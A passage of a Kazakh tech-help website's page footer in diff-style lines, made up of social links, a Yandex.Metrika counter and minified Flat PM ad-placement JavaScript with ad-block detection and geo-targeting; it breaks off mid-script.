+<li id="menu-item-9488" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9488"><a href="https://www.facebook.com/groups/MHelpKZ/">Facebook</a></li>
+<li id="menu-item-9487" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9487"><a href="https://vk.com/mhelpkz">ВКонтакте</a></li>
+<li id="menu-item-9489" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9489"><a href="https://zen.yandex.ru/profile/editor/id/5a88557f55876b0c0e7ec88e">Яндекс.Дзен</a></li>
+</ul>	</div>
+	
+	    	<div class="copyrights maxwidth grid">
+		<div class="copytext col6">
+			<p id="copy">
+				<!--noindex--><a href="https://mhelp.kz/" rel="nofollow">MHelp.kz: Время делиться знаниями [Юн Сергей]</a><!--/noindex--> © 2023				<br>
+				<span class="copyright-text">При копировании материалов должна присутствовать ссылка на MHelp.kz</span>
+				<br><a class="privacy-policy-link" href="https://mhelp.kz/privacy-policy/">Политика конфиденциальности</a>			</p>
+		</div>
+
+		<div class="themeby col6 tr">
+			
+						<div class="footer-counter"></div>
+		</div>
+	</div>
+    	
+</footer>
+
+
+</div> 
+<!-- .wrapper -->
+
+<a id="toTop">➤</a>
+
+<!-- Yandex.Metrika counter -->
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript">
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(28768331, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true
+   });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/28768331" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter --><script data-minify="1" type="text/javascript" src="https://mhelp.kz/wp-content/cache/min/1/ajax/libs/jquery/3.5.1/jquery.min.js?ver=1674637612" id="jquery-js"></script>
+<!--[if lt IE 9]>
+<script type='text/javascript' src='https://mhelp.kz/wp-content/themes/basic/js/html5shiv.min.js?ver=3.7.3' id='basic-html5shiv-js'></script>
+<![endif]-->
+<script data-minify="1" type="text/javascript" src="https://mhelp.kz/wp-content/cache/min/1/wp-content/themes/basic/js/functions.js?ver=1674637612" id="basic-scripts-js"></script>
+<script type="text/javascript" id="heateor_sss_sharing_js-js-before">
+function heateorSssLoadEvent(e) {var t=window.onload;if (typeof window.onload!="function") {window.onload=e}else{window.onload=function() {t();e()}}};	var heateorSssSharingAjaxUrl = 'https://mhelp.kz/wp-admin/admin-ajax.php', heateorSssCloseIconPath = 'https://mhelp.kz/wp-content/plugins/sassy-social-share/public/../images/close.png', heateorSssPluginIconPath = 'https://mhelp.kz/wp-content/plugins/sassy-social-share/public/../images/logo.png', heateorSssHorizontalSharingCountEnable = 0, heateorSssVerticalSharingCountEnable = 0, heateorSssSharingOffset = -10; var heateorSssMobileStickySharingEnabled = 1;var heateorSssCopyLinkMessage = "Ссылка скопирована.";var heateorSssUrlCountFetched = [], heateorSssSharesText = 'Поделились', heateorSssShareText = 'Поделиться';function heateorSssPopup(e) {window.open(e,"popUpWindow","height=400,width=600,left=400,top=100,resizable,scrollbars,toolbar=0,personalbar=0,menubar=no,location=no,directories=no,status")}
+</script>
+<script data-minify="1" type="text/javascript" src="https://mhelp.kz/wp-content/cache/min/1/wp-content/plugins/sassy-social-share/public/js/sassy-social-share-public.js?ver=1674637612" id="heateor_sss_sharing_js-js"></script>
+<ins id="adsense" class="adsbygoogle" data-tag="flat_pm" style="position:absolute;left:-9999px;top:-9999px">Adblock<br>detector</ins>
+<style>
+.fpm_5_modal{position:fixed;top:50%;left:50%;height:auto;z-index:-2000;visibility:hidden;backface-visibility:hidden;transform:translateX(-50%) translateY(-50%)}
+.fpm_5_modal-show{z-index:2000;visibility:visible}
+.fpm_5_modal-overlay{position:fixed;width:100%;height:100%;visibility:hidden;top:0;left:0;z-index:-1000;opacity:0;background:rgba(0,0,0,.55);transition:opacity .3s ease}
+.fpm_5_modal-show ~ .fpm_5_modal-overlay{z-index:1000;opacity:1;visibility:visible}
+.fpm_5_modal-content{background:#fff;position:relative;transform:translateY(30%);opacity:0;transition:all .3s ease;min-width:200px;min-height:100px}
+.fpm_5_modal-show .fpm_5_modal-content{transform:translateY(0);opacity:1}
+.fpm_5_modal .fpm_5_timer,
+.fpm_5_modal .fpm_5_cross{top:0!important}
+.fpm_5_cross{transition:box-shadow .2s ease;position:absolute;top:-0px;right:0;width:34px;height:34px;background:#000000;display:block;cursor:pointer;z-index:99;border:none;padding:0;min-width:0;min-height:0}
+.fpm_5_cross:hover{box-shadow:0 0 0 50px rgba(0,0,0,.2) inset}
+.fpm_5_cross:after,
+.fpm_5_cross:before{transition:transform .3s ease;content:'';display:block;position:absolute;top:0;left:0;right:0;bottom:0;width:calc(34px / 2);height:3px;background:#ffffff;transform-origin:center;transform:rotate(45deg);margin:auto}
+.fpm_5_cross:before{transform:rotate(-45deg)}
+.fpm_5_cross:hover:after{transform:rotate(225deg)}
+.fpm_5_cross:hover:before{transform:rotate(135deg)}
+.fpm_5_timer{position:absolute;top:-0px;right:0;padding:0 15px;color:#ffffff;background:#000000;line-height:34px;height:34px;text-align:center;font-size:14px;z-index:99}
+.fpm_5_timer span{font-size:16px;font-weight:600}
+.fpm_5_out{transition:transform .3s ease,opacity 0s ease;transition-delay:0s,.3s;position:fixed;min-width:250px;min-height:150px;z-index:9999;opacity:0;-webkit-backface-visibility:hidden}
+.fpm_5_out *{max-width:none!important}
+.fpm_5_out.top .fpm_5_cross{top:auto;bottom:150px}
+.fpm_5_out.show.top .fpm_5_cross{bottom:-0px}
+.fpm_5_out.bottom .fpm_5_cross{top:150px}
+.fpm_5_out.show.bottom .fpm_5_cross{top:-0px}
+.fpm_5_out.right .fpm_5_cross{right:auto;left:0}
+.fpm_5_out.top .fpm_5_timer{top:auto;bottom:150px}
+.fpm_5_out.show.top .fpm_5_timer{bottom:-0px}
+.fpm_5_out.bottom .fpm_5_timer{top:150px}
+.fpm_5_out.show.bottom .fpm_5_timer{top:-0px}
+.fpm_5_out.right .fpm_5_timer{right:auto;left:0}
+.fpm_5_out.top{bottom:100%;left:50%;transform:translateY(0) translateX(-50%);padding-bottom:150px}
+.fpm_5_out.bottom{top:100%;left:50%;transform:translateY(0) translateX(-50%);padding-top:150px}
+.fpm_5_out.left{bottom:0;right:100%;transform:translateX(0);left:auto}
+.fpm_5_out.right{bottom:0;left:100%;transform:translateX(0);right:auto}
+.fpm_5_out.show{transition-delay:0s,0s;opacity:1;min-width:0;min-height:0;background:#fff}
+.fpm_5_out.closed{min-width:0;min-height:0}
+.fpm_5_out.show.top{transform:translateY(100%) translateX(-50%);padding-bottom:0px}
+.fpm_5_out.show.bottom{transform:translateY(-100%) translateX(-50%);padding-top:0px}
+.fpm_5_out.show.left{transform:translateX(100%)}
+.fpm_5_out.show.right{transform:translateX(-100%)}
+.flatpm_fixed{position:fixed;z-index:50}
+.flatpm_stop{position:relative;z-index:50}
+.fpm_5_video{position:relative;overflow:hidden;padding-bottom:56.25%;height:0}
+.fpm_5_video iframe{display:block;width:100%;height:100%;position:absolute}
+.fpm_5_video_flex{display:flex;align-items:center;justify-content:center;position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.65);opacity:0;transition:opacity .35s ease}
+.fpm_5_video_flex.show{opacity:1}
+.fpm_5_video_item{position:relative;max-height:calc(100% - 68px);max-width:calc(100% - 68px);z-index:-1}
+.fpm_5_video_flex.show .fpm_5_video_item{z-index:1}
+.fpm_5_video_flex .fpm_5_timer,
+.fpm_5_video_flex .fpm_5_cross{top:10px!important;right:10px!important}
+.fpm_5_video_item_hover{position:absolute;top:0;left:0;right:0;bottom:0;width:100%;height:100%;cursor:pointer;z-index:2}
+</style>
+<script type="rocketlazyloadscript">var duplicateMode="undefined"!=typeof duplicateFlatPM&&duplicateFlatPM,untilscroll="undefined"!=typeof untilscrollFlatPM?untilscrollFlatPM:".flat_pm_end";document['wr'+'ite']=function(t){var e=document.createElement("div");ff(document.currentScript).after(e),flatPM_setHTML(e,t),ff(e).contents().unwrap()},window.flatPM_sticky=function(t,a,e){var l=t,d=null,s=e=e||0;function n(){if(null==d){for(var t=getComputedStyle(l,""),e="",n=0;n<t.length;n++)0!=t[n].indexOf("overflow")&&0!=t[n].indexOf("padding")&&0!=t[n].indexOf("border")&&0!=t[n].indexOf("outline")&&0!=t[n].indexOf("box-shadow")&&0!=t[n].indexOf("background")||(e+=t[n]+": "+t.getPropertyValue(t[n])+"; ");(d=document.createElement("div")).style.cssText=e+" box-sizing: border-box; width: "+l.offsetWidth+"px;",l.insertBefore(d,l.firstChild);for(var o=l.childNodes.length,n=1;n<o;n++)d.appendChild(l.childNodes[1]);l.style.padding="0",l.style.border="0"}l.style.height=d.getBoundingClientRect().height+"px";var r=l.getBoundingClientRect(),i=Math.round(r.top+d.getBoundingClientRect().height-a.getBoundingClientRect().bottom);r.top-s<=0?r.top-s<=i?(d.className="flatpm_stop",d.style.top=-i+"px"):(d.className="flatpm_fixed",d.style.top=s+"px"):(d.className="",d.style.top=""),window.addEventListener("resize",function(){l.children[0].style.width=getComputedStyle(l,"").width},!1)}window.addEventListener("scroll",n,!1),document.body.addEventListener("scroll",n,!1)},window.flatPM_addDays=function(t,e){var n=60*t.getTimezoneOffset()*1e3,o=t.getTime(),t=new Date;return o+=864e5*e,t.setTime(o),n!=(e=60*t.getTimezoneOffset()*1e3)&&(o+=e-n,t.setTime(o)),t},window.flatPM_adbDetect=function(){var t=document.querySelector('#adsense.adsbygo'+'ogle[data-tag="flat_pm"]');if(!t)return!0;t=t.currentStyle||window.getComputedStyle(t,null),t=parseInt(t.height);return!(!isNaN(t)&&0!=t)},window.flatPM_setCookie=function(t,e,n){var o,r=(n=n||{path:"/"}).expires;"number"==typeof r&&r&&((o=new Date).setTime(o.getTime()+1e3*r),r=n.expires=o),r&&r.toUTCString&&(n.expires=r.toUTCString());var i,a=t+"="+(e=encodeURIComponent(e));for(i in n){a+="; "+i;var l=n[i];!0!==l&&(a+="="+l)}document.cookie=a},window.flatPM_getCookie=function(n){var t=document.cookie.split("; ").reduce(function(t,e){e=e.split("=");return e[0]===n?decodeURIComponent(e[1]):t},"");return""!=t?t:void 0},window.flatPM_testCookie=function(){var t="test_56445";try{return localStorage.setItem(t,t),localStorage.removeItem(t),!0}catch(t){return!1}},window.flatPM_grep=function(t,n,o){return ff.grep(t,function(t,e){return o?e==n:(e+1)%n==0})},window.flatPM_randomString=function(t){for(var e="",n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",o=n.length,r=0;r<t;r++)e+=n.charAt(Math.floor(Math.random()*o));return e},window.flatPM_random=function(t,e){return Math.floor(Math.random()*(e-t+1))+t},window.flatPM_sanitizeUrlParams=function(t){return t&&["__proto__","constructor","prototype"].includes(t.toLowerCase())?t.toUpperCase():t},window.flatPM_getAllUrlParams=function(t){var e={};if(!t||0==t.length)return e;t=(t=flatPM_sanitizeUrlParams(t))?t.split("?")[1]:window.location.search.slice(1);if(t)for(var n=(t=t.split("#")[0]).split("&"),o=0;o<n.length;o++){var r,i=n[o].split("="),a=i[0],l=void 0===i[1]||i[1],a=a.toLowerCase();"string"==typeof l&&(l=l.toLowerCase()),a.match(/\[(\d+)?\]$/)?(e[r=a.replace(/\[(\d+)?\]/,"")]||(e[r]=[]),a.match(/\[\d+\]$/)?(i=/\[(\d+)\]/.exec(a)[1],e[r][i]=l):e[r].push(l)):e[a]?(e[a]&&"string"==typeof e[a]&&(e[a]=[e[a]]),e[a].push(l)):e[a]=l}return e};var ff,flat_body,flat_stack_scripts=[],flat_pm_then=[],flat_date=new Date,flat_titles="h1,h2,h3,h4,h5,h6",flat_dateYear=flat_date.getFullYear(),flat_dateMonth=2==(flat_date.getMonth()+1+"").length?flat_date.getMonth()+1:"0"+(flat_date.getMonth()+1),flat_dateDay=2==(flat_date.getDate()+"").length?flat_date.getDate():"0"+flat_date.getDate(),flat_dateHours=2==(flat_date.getHours()+"").length?flat_date.getHours():"0"+flat_date.getHours(),flat_dateMinutes=2==(flat_date.getMinutes()+"").length?flat_date.getMinutes():"0"+flat_date.getMinutes(),flat_userVars={init:function(){this.testcook=flatPM_testCookie(),this.browser=this.searchString(this.dataBrowser)||!1,this.os=this.searchString(this.dataOS)||!1,this.referer=this.cookieReferer(),this.winwidth=window.innerWidth,this.date=flat_dateYear+"-"+flat_dateMonth+"-"+flat_dateDay,this.time=flat_dateHours+":"+flat_dateMinutes,this.adb=flatPM_adbDetect(),this.until=ff(".flat_pm_start").nextUntil(".flat_pm_end"),this.textlen=this.until.text().replace(/(\s)+/g,"").length,this.titlelen=this.until.find(flat_titles).add(this.until.siblings(flat_titles)).length,this.country=this.cookieData("country"),this.city=this.cookieData("city"),this.ccode=this.cookieData("ccode"),this.role=this.cookieData("role"),this.ip=this.cookieData("ip")},cookieReferer:function(){return parent!==window?"///:iframe":flat_userVars.testcook?(void 0===flatPM_getCookie("flat_r_mb")&&flatPM_setCookie("flat_r_mb",""!=document.referrer?document.referrer:"///:direct"),flatPM_getCookie("flat_r_mb")):""!=document.referrer?document.referrer:"///:direct"},cookieData:function(t){return flat_userVars.testcook&&void 0!==flatPM_getCookie("flat_"+t+"_mb")?flatPM_getCookie("flat_"+t+"_mb"):""},searchString:function(t){for(var e=t.length,o=0;o<e;o++){var a=t[o].str;if(a&&t[o].subStr.test(a))return t[o].id}},dataBrowser:[{str:navigator.userAgent,subStr:/OmniWeb/,ver:"OmniWeb/",id:"OmniWeb"},{str:navigator.userAgent,subStr:/YaBrowser/,id:"YaBrowser"},{str:navigator.vendor,subStr:/Apple/,id:"Safari",ver:"Version"},{str:navigator.userAgent,subStr:/OPR/,id:"Opera",ver:"Version"},{str:navigator.userAgent,subStr:/Firefox/,id:"Firefox"},{str:navigator.userAgent,subStr:/.NET CLR/,id:"Internet Explorer",ver:"MSIE"},{str:navigator.userAgent,subStr:/Edge/,id:"Edge",ver:"rv"},{str:navigator.vendor,subStr:/iCab/,id:"iCab"},{str:navigator.vendor,subStr:/KDE/,id:"Konqueror"},{str:navigator.vendor,subStr:/Camino/,id:"Camino"},{str:navigator.userAgent,subStr:/Netscape/,id:"Netscape"},{str:navigator.userAgent,subStr:/Chrome/,id:"Chrome"},{str:navigator.userAgent,subStr:/Mozilla/,id:"Netscape",ver:"Mozilla"}],dataOS:[{str:navigator.platform,subStr:/Win/,id:"Windows"},{str:navigator.platform,subStr:/Mac/,id:"Mac"},{str:navigator.platform,subStr:/(iPhone|iPad|iPod)/,id:"iPhone"},{str:navigator.platform,subStr:/Linux/,id:"Linux"}]};/zen.yandex/.test(flatPM_getAllUrlParams().utm_referrer)&&(flatPM_setCookie("flat_r_mb","zen.yandex"),flat_userVars.referer="zen.yandex"),window.flatPM_ajax=function(t,e){e=e||[],ff.ajax({type:"POST",url:ajaxUrlFlatPM,dataType:"json",data:{action:"flat_pm_ajax",data_me:{method:t,arr:e}},success:function(t){flat_body.removeClass(t.method),"block_geo_role_ip"===t.method?(flat_userVars.ccode=t.data.ccode,flat_userVars.country=t.data.country,flat_userVars.city=t.data.city,flat_userVars.ip=t.data.ip,flat_userVars.testcook&&(flatPM_setCookie("flat_ccode_mb",t.data.ccode),flatPM_setCookie("flat_country_mb",t.data.country),flatPM_setCookie("flat_city_mb",t.data.city),flatPM_setCookie("flat_ip_mb",t.data.ip),flatPM_setCookie("flat_role_mb",t.data.role)),flatPM_then()):(console.log("ajax error:"),console.error("Метод оказался ошибочным"))},error:function(){console.log("ajax error:"),console.error("Скрипт php вернул ошибку")}})},window.flatPM_then=function(){var t=flat_pm_then.length;if(0!=t){for(var e=0;e<t;e++){var o=flat_pm_then[e];flatPM_next(o)}0<flat_stack_scripts.length&&flatPM_setSCRIPT(flat_stack_scripts)}else flat_pm_then=[]},window.flatPM_persentWrapper=function(t,o,e){var a=0,r=!1;return t.each(function(){var t=ff(this),e=t.clone().find("img, ins, script, style, noscript").remove().end().text().replace(/(\s)+/g,"");if(a+=e.length,o<=a)return r=t,!1}),r},window.flatPM_setWrap=function(t){try{var e,o,a,r,i,l,s,f,n,d=document.createElement("div");d.setAttribute("data-flat-id",t.ID),void 0!==t.how.simple&&("1"==t.how.simple.position&&ff(".flat_pm_start").before(d),"2"==t.how.simple.position&&ff(flat_userVars.until[Math.round(flat_userVars.until.length/2)]).before(d),"3"==t.how.simple.position&&ff(".flat_pm_end").before(d),"4"==t.how.simple.position&&ff(flat_userVars.until[Math.round(flat_userVars.until.length*t.how.simple.fraction.split("/")[0]/t.how.simple.fraction.split("/")[1])]).before(d),"5"==t.how.simple.position&&t.how.simple.fraction<=flat_userVars.textlen&&(!1===(e=flatPM_persentWrapper(flat_userVars.until,t.how.simple.fraction,d))||e.next().is("[data-flat-id]")||e.after(d)),"6"==t.how.simple.position&&(d.setAttribute("data-flat-type","6"),r=flat_userVars.textlen/100*t.how.simple.fraction,e=flatPM_persentWrapper(flat_userVars.until,r,d),(o=!1)!==e&&(a=e.prevAll('[data-flat-type="6"]:first'),r=e.nextAll('[data-flat-type="6"]:first'),0!=a.length&&(console.log(e.prevUntil(a).text().replace(/(\s)+/g,"").length),e.prevUntil(a).text().replace(/(\s)+/g,"").length<t.how.simple.interval&&(o=!0)),0!=r.length&&(console.log(e.nextUntil(r).text().replace(/(\s)+/g,"").length),e.nextUntil(r).text().replace(/(\s)+/g,"").length<t.how.simple.interval&&(o=!0)),o||e.after(d)))),void 0!==t.how.onсe&&(i="true"==t.how.onсe.search_all?ff("html"):flat_userVars.until,l=t.how.onсe.N,s=t.how.onсe.selector,f=t.how.onсe.direction,n=t.how.onсe.before_after,0<(i=i.find(s).add(i.filter(s))).length&&(l="bottom_to_top"==f?i.length-l:l-1,"after"==n&&ff(flatPM_grep(i,l,1)).after(d),"before"==n&&ff(flatPM_grep(i,l,1)).before(d),"append"==n&&ff(flatPM_grep(i,l,1)).append(d),"prepend"==n&&ff(flatPM_grep(i,l,1)).prepend(d))),void 0!==t.how.iterable&&(i="true"==t.how.iterable.search_all?ff("html"):flat_userVars.until,l=t.how.iterable.N,s=t.how.iterable.selector,f=t.how.iterable.direction,n=t.how.iterable.before_after,0<(i=i.find(s).add(i.filter(s))).length&&("bottom_to_top"==f&&(i=i.get().reverse()),"after"==n&&ff(flatPM_grep(i,l,0)).after(d),"before"==n&&ff(flatPM_grep(i,l,0)).before(d),"append"==n&&ff(flatPM_grep(i,l,0)).append(d),"prepend"==n&&ff(flatPM_grep(i,l,0)).prepend(d)))}catch(t){console.warn(t)}},window.flatPM_next=function(a){try{var t=[],e="",o=a.html.length;if(void 0!==a.ip&&"false"==flat_userVars.ip)return void ff('[data-flat-id="'+a.ID+'"]').remove();if(void 0!==a.role&&(void 0!==a.role.role_enabled&&-1==a.role.role_enabled.indexOf(flat_userVars.role)||void 0!==a.role.role_disabled&&-1!=a.role.role_disabled.indexOf(flat_userVars.role)))return void ff('[data-flat-id="'+a.ID+'"]').remove();if(void 0!==a.geo&&(void 0!==a.geo.country_enabled&&-1==a.geo.country_enabled.indexOf(flat_userVars.country)&&-1==a.geo.country_enabled.indexOf(flat_userVars.ccode)||void 0!==a.geo.country_disabled&&(-1!=a.geo.country_disabled.indexOf(flat_userVars.country)||-1!=a.geo.country_disabled.indexOf(flat_userVars.ccode))||void 0!==a.geo.city_enabled&&-1==a.geo.city_enabled.indexOf(flat_userVars.city)||void 0!==a.geo.city_disabled&&-1!=a.geo.city_disabled.indexOf(flat_userVars.city)))return void ff('[data-flat-id="'+a.ID+'"]').remove();for(var r,i,l,s,f=0;f<o;f++)("∞"==a.html[f].res_of||a.html[f].res_of<=flat_userVars.winwidth)&&("∞"==a.html[f].res_to||a.html[f].res_to>flat_userVars.winwidth)&&(void 0!==a.html[f].group?flat_userVars.adb?(null==t["group_"+a.html[f].group]&&(t["group_"+a.html[f].group]=[]),t["group_"+a.html[f].group].push(""==a.html[f].snd&&duplicateMode?a.html[f].fst:a.html[f].snd)):(null==t["group_"+a.html[f].group]&&(t["group_"+a.html[f].group]=[]),t["group_"+a.html[f].group].push(a.html[f].fst)):flat_userVars.adb?t.push(""==a.html[f].snd&&duplicateMode?a.html[f].fst:a.html[f].snd):t.push(a.html[f].fst));for(r in t)e="object"==typeof t[r]?e+"\n"+t[r][flatPM_random(0,t[r].length-1)]:e+"\n"+t[r];if(""==(e=e.replace(/<!-(.*?)->/gm,"").replace(/<!—(.*?)—>/gm,"").trim()))return void ff('[data-flat-id="'+a.ID+'"]').remove();if(void 0===a.how.simple&&void 0===a.how.onсe&&void 0===a.how.iterable||ff('[data-flat-id="'+a.ID+'"]').each(function(){flatPM_setHTML(this,e)}),void 0!==a.how.popup&&(p="true"==a.how.popup.cross?void 0!==a.how.popup.timer&&"true"==a.how.popup.timer?'<div class="fpm_5_timer">Закрыть через <span>'+a.how.popup.timer_count+"</span></div>":'<button class="fpm_5_cross"></button>':"",document.createElement("div"),c=ff(window),b=ff("body"),g=void 0===flatPM_getCookie("flat_modal_"+a.ID+"_mb")||"false"!=flatPM_getCookie("flat_modal_"+a.ID+"_mb"),i="scroll.flatmodal"+a.ID,m="mouseleave.flatmodal"+a.ID+" blur.flatmodal"+a.ID,l=function(){var t,e,o;void 0!==a.how.popup.timer&&"true"==a.how.popup.timer&&(t=ff('.fpm_5_modal[data-id-modal="'+a.ID+'"] .fpm_5_timer span'),e=parseInt(a.how.popup.timer_count),o=setInterval(function(){t.text(--e),e<=0&&(clearInterval(o),t.parent().replaceWith('<button class="fpm_5_cross"></button>'))},1e3))},s=function(){void 0!==a.how.popup.cookie&&"false"==a.how.popup.cookie&&g&&(flatPM_setCookie("flat_modal_"+a.ID+"_mb",!1),ff('.fpm_5_modal[data-id-modal="'+a.ID+'"]').addClass("fpm_5_modal-show"),l()),void 0!==a.how.popup.cookie&&"false"==a.how.popup.cookie||(ff('.fpm_5_modal[data-id-modal="'+a.ID+'"]').addClass("fpm_5_modal-show"),l())},ff("body > *").eq(0).before('<div class="fpm_5_modal" data-flat-id="'+a.ID+'" data-id-modal="'+a.ID+'"><div class="fpm_5_modal-content">'+p+"</div></div>"),w=document.querySelector('.fpm_5_modal[data-id-modal="'+a.ID+'"] .fpm_5_modal-content'),flatPM_setHTML(w,e),"px"==a.how.popup.px_s?(c.bind(i,function(){c.scrollTop()>a.how.popup.after&&(c.unbind(i),b.unbind(m),s())}),void 0!==a.how.popup.close_window&&"true"==a.how.popup.close_window&&b.bind(m,function(){c.unbind(i),b.unbind(m),s()})):(v=setTimeout(function(){b.unbind(m),s()},1e3*a.how.popup.after),void 0!==a.how.popup.close_window&&"true"==a.how.popup.close_window&&b.bind(m,function(){clearTimeout(v),b.unbind(m),s()}))),void 0!==a.how.outgoing){function n(){var t,e,o;void 0!==a.how.outgoing.timer&&"true"==a.how.outgoing.timer&&(t=ff('.fpm_5_out[data-id-out="'+a.ID+'"] .fpm_5_timer span'),e=parseInt(a.how.outgoing.timer_count),o=setInterval(function(){t.text(--e),e<=0&&(clearInterval(o),t.parent().replaceWith('<button class="fpm_5_cross"></button>'))},1e3))}function d(){void 0!==a.how.outgoing.cookie&&"false"==a.how.outgoing.cookie&&g&&(ff('.fpm_5_out[data-id-out="'+a.ID+'"]').addClass("show"),n(),b.on("click",'.fpm_5_out[data-id-out="'+a.ID+'"] .fpm_5_cross',function(){flatPM_setCookie("flat_out_"+a.ID+"_mb",!1)})),void 0!==a.how.outgoing.cookie&&"false"==a.how.outgoing.cookie||(ff('.fpm_5_out[data-id-out="'+a.ID+'"]').addClass("show"),n())}var _,u="0"!=a.how.outgoing.indent?' style="bottom:'+a.how.outgoing.indent+'px"':"",p="true"==a.how.outgoing.cross?void 0!==a.how.outgoing.timer&&"true"==a.how.outgoing.timer?'<div class="fpm_5_timer">Закрыть через <span>'+a.how.outgoing.timer_count+"</span></div>":'<button class="fpm_5_cross"></button>':"",c=ff(window),h="scroll.out"+a.ID,m="mouseleave.outgoing"+a.ID+" blur.outgoing"+a.ID,g=void 0===flatPM_getCookie("flat_out_"+a.ID+"_mb")||"false"!=flatPM_getCookie("flat_out_"+a.ID+"_mb"),b=(document.createElement("div"),ff("body"));switch(a.how.outgoing.whence){case"1":_="top";break;case"2":_="bottom";break;case"3":_="left";break;case"4":_="right"}ff("body > *").eq(0).before('<div class="fpm_5_out '+_+'"'+u+' data-flat-id="'+a.ID+'" data-id-out="'+a.ID+'">'+p+"</div>");var v,w=document.querySelector('.fpm_5_out[data-id-out="'+a.ID+'"]');flatPM_setHTML(w,e),"px"==a.how.outgoing.px_s?(c.bind(h,function(){c.scrollTop()>a.how.outgoing.after&&(c.unbind(h),b.unbind(m),d())}),void 0!==a.how.outgoing.close_window&&"true"==a.how.outgoing.close_window&&b.bind(m,function(){c.unbind(h),b.unbind(m),d()})):(v=setTimeout(function(){b.unbind(m),d()},1e3*a.how.outgoing.after),void 0!==a.how.outgoing.close_window&&"true"==a.how.outgoing.close_window&&b.bind(m,function(){clearTimeout(v),b.unbind(m),d()}))}}catch(t){console.warn(t)}},window.flatPM_start=function(){ff=jQuery;var t=flat_pm_arr.length;flat_body=ff("body"),flat_userVars.init();for(var e=0;e<t;e++){var o=flat_pm_arr[e],a=!1;if(!(void 0!==o.chapter_limit&&o.chapter_limit>flat_userVars.textlen||void 0!==o.chapter_sub&&o.chapter_sub<flat_userVars.textlen||void 0!==o.title_limit&&o.title_limit>flat_userVars.titlelen||void 0!==o.title_sub&&o.title_sub<flat_userVars.titlelen)){if(void 0!==o.date){if(void 0!==o.date.time_of&&void 0!==o.date.time_to){var r=new Date(flat_userVars.date+"T"+o.date.time_of+":00"),i=new Date(flat_userVars.date+"T"+o.date.time_to+":00"),l=new Date(flat_userVars.date+"T12:00:00"),s=new Date(flat_userVars.date+"T"+flat_userVars.time+":00");if(i<r&&i<l&&(i=flatPM_addDays(i,1)),i<r&&l<i&&(r=flatPM_addDays(r,-1)),s<r||i<s)continue}if(void 0!==o.date.date_of&&void 0!==o.date.date_to){var i=new Date(o.date.date_of+"T00:00:00"),s=new Date(o.date.date_to+"T00:00:00"),f=new Date(flat_userVars.date+"T00:00:00");if(f<i||s<f)continue}}if(void 0===o.os||!(void 0!==o.os.os_enabled&&-1==o.os.os_enabled.indexOf(flat_userVars.os)||void 0!==o.os.os_disabled&&-1!=o.os.os_disabled.indexOf(flat_userVars.os))){if(void 0!==o.cookies){var n=!1;if(void 0!==o.cookies.cookies_enabled){if(!flat_userVars.testcook)continue;ff(o.cookies.cookies_enabled).each(function(){var t=this.split(":",2),e=t[0],t=void 0!==t[1]&&t[1];if(!(n=!0)!==t){if(void 0!==flatPM_getCookie(e)&&flatPM_getCookie(e)==t)return n=!1}else if(void 0!==flatPM_getCookie(e))return n=!1})}if(void 0!==o.cookies.cookies_disabled&&flat_userVars.testcook&&ff(o.cookies.cookies_disabled).each(function(){var t=this.split(":",2),e=t[0],t=void 0!==t[1]&&t[1];if(!1!==t){if(void 0!==flatPM_getCookie(e)&&flatPM_getCookie(e)==t)return!(n=!0)}else if(void 0!==flatPM_getCookie(e))return!(n=!0)}),n)continue}if(void 0!==o.utmget){var d=!1;if(void 0!==o.utmget.utmget_enabled&&ff(o.utmget.utmget_enabled).each(function(){var t=this.split(":",2),e=t[0],t=void 0!==t[1]&&t[1];if(!(d=!0)!==t){if(void 0!==flatPM_getAllUrlParams()[e]&&flatPM_getAllUrlParams()[e]==t)return d=!1}else if(void 0!==flatPM_getAllUrlParams()[e])return d=!1}),void 0!==o.utmget.utmget_disabled&&ff(o.utmget.utmget_disabled).each(function(){var t=this.split(":",2),e=t[0],t=void 0!==t[1]&&t[1];if(!1!==t){if(void 0!==flatPM_getAllUrlParams()[e]&&flatPM_getAllUrlParams()[e]==t)return!(d=!0)}else if(void 0!==flatPM_getAllUrlParams()[e])return!(d=!0)}),d)continue}void 0!==o.referer&&(void 0!==o.referer.referer_enabled&&-1==o.referer.referer_enabled.findIndex(function(t){return-1!=flat_userVars.referer.indexOf(t)})||void 0!==o.referer.referer_disabled&&-1!=o.referer.referer_disabled.findIndex(function(t){return-1!=flat_userVars.referer.indexOf(t)}))&&(a=!0),!a&&void 0!==o.browser&&(void 0!==o.browser.browser_enabled&&-1==o.browser.browser_enabled.indexOf(flat_userVars.browser)||void 0!==o.browser.browser_disabled&&-1!=o.browser.browser_disabled.indexOf(flat_userVars.browser))||(a&&void 0!==o.browser&&void 0!==o.browser.browser_enabled&&-1!=o.browser.browser_enabled.indexOf(flat_userVars.browser)&&(a=!1),a||void 0===o.geo&&void 0===o.ip&&void 0===o.role||""!=flat_userVars.ccode&&""!=flat_userVars.country&&""!=flat_userVars.city&&""!=flat_userVars.ip&&""!=flat_userVars.role||(f="block_geo_role_ip",flat_pm_then.push(o),flatPM_setWrap(o),flat_body.hasClass(f)||(flat_body.addClass(f),flatPM_ajax(f)),a=!0),a||(flatPM_setWrap(o),flatPM_next(o)))}}}var _=ff(".flatPM_sticky"),u=ff("*:has(>.flatPM_sidebar)");0<_.length&&_.each(function(){var t=ff(this),e=t.data("height")||350,o=t.data("top");t.wrap('<div class="flatPM_sticky_wrapper" style="height:'+e+'px" />');t=t.parent()[0];flatPM_sticky(this,t,o)}),u.each(function(){var e=ff(this).find(".flatPM_sidebar");setTimeout(function(){var a=(ff(untilscroll).offset().top-e.first().offset().top)/e.length;a<300||e.each(function(){var t=ff(this),e=a,o=t.data("top");t.wrap('<div class="flatPM_sticky_wrapper flatPM_sidebar_block" style="height:'+e+'px" 